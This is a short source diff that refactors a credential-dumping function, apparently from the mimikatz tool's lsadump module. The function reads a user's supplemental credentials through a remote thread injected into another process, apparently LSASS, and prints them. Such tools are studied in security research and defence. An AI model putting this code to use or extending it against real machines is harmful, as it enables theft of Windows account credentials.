@@ -1062,6 +1062,8 @@ void kuhl_m_lsadump_lsa_user(SAMPR_HANDLE DomainHandle, DWORD rid, PUNICODE_STRI
 	DWORD BufferSize = 0, i;
 	PLSA_SUPCREDENTIALS pCreds = NULL;
 	PLSA_SUPCREDENTIAL pCred;
+	PREMOTE_LIB_INPUT_DATA iData;
+	REMOTE_LIB_OUTPUT_DATA oData;
 
 	kprintf(L"\nRID  : %08x (%u)\nUser : %wZ\n", rid, rid, name);
 
@@ -1087,18 +1089,22 @@ void kuhl_m_lsadump_lsa_user(SAMPR_HANDLE DomainHandle, DWORD rid, PUNICODE_STRI
 	}
 	else
 	{
-		if(kull_m_remotelib_create(aRemoteThread, &rid, sizeof(rid), (PVOID *) &pCreds, &BufferSize, FALSE))
+		if(iData = kull_m_remotelib_CreateInput(NULL, rid, 0, NULL))
 		{
-			if(pCreds && BufferSize)
+			if(kull_m_remotelib_create(aRemoteThread, iData, &oData))
 			{
-				for(i = 0; i < pCreds->count; i++)
+				if(pCreds = (PLSA_SUPCREDENTIALS) oData.outputData)
 				{
-					pCred = ((PLSA_SUPCREDENTIAL) ((PBYTE) pCreds + sizeof(LSA_SUPCREDENTIALS))) + i;
-					if(pCred->offset && pCred->size)
-						kuhl_m_lsadump_lsa_DescrBuffer(pCred->type, (PBYTE) pCreds + pCred->offset, pCred->size);
+					for(i = 0; i < pCreds->count; i++)
+					{
+						pCred = ((PLSA_SUPCREDENTIAL) ((PBYTE) pCreds + sizeof(LSA_SUPCREDENTIALS))) + i;
+						if(pCred->offset && pCred->size)
+							kuhl_m_lsadump_lsa_DescrBuffer(pCred->type, (PBYTE) pCreds + pCred->offset, pCred->size);
+					}
+					LocalFree(pCreds);
 				}
-				LocalFree(pCreds);
 			}
+			LocalFree(iData);
 		}
 	}
 }
